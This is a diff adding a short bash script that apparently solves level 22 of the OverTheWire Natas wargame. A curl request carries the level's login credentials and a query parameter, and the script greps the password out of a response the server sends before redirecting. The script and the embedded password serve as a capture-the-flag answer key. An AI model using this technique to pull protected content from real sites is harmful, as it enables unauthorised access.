@@ -1,0 +1,3 @@
+#!/bin/bash
+
+curl --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org?revelio=test 2>&1 | grep Password | cut -d "<" -f1
